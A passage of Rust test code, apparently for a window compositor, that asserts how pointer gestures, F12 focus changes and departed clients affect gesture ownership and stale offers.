    let body =
        t.s.c
            .window(Key {
                client: 0,
                id: t.ida,
            })
            .unwrap()
            .body_rect();
    assert_eq!(d.over.0, 1);
    assert_eq!(
        (i64::from(d.x), i64::from(d.y)),
        ((qx - body.x) / 2, (qy - body.y) / 2)
    );
    // a pressed (a's gesture); F12 moves the focus to b: a's right is gone.
    let mut t = two();
    let (ax, ay) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, ax, ay, Some(1));
    at(&mut t.s, ax, ay, Some(0));
    t.s.keys(&[(code::F12, 1), (code::F12, 0)]);
    assert_ne!(t.s.c.focused().map(|k| k.client), Some(0));
    assert_eq!(offer(&mut t.s, t.a, "stale"), status::BAD_RANGE);
    // A gesture of a client that ends is not the next one's.
    let mut t = two();
    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
    at(&mut t.s, bx, by, Some(1));
    at(&mut t.s, bx, by, Some(0));
    t.s.f().peers.get_mut(&t.b).unwrap().gone = true;
    t.s.c.step();
    assert_eq!(t.s.c.gesture_client(), None);
}
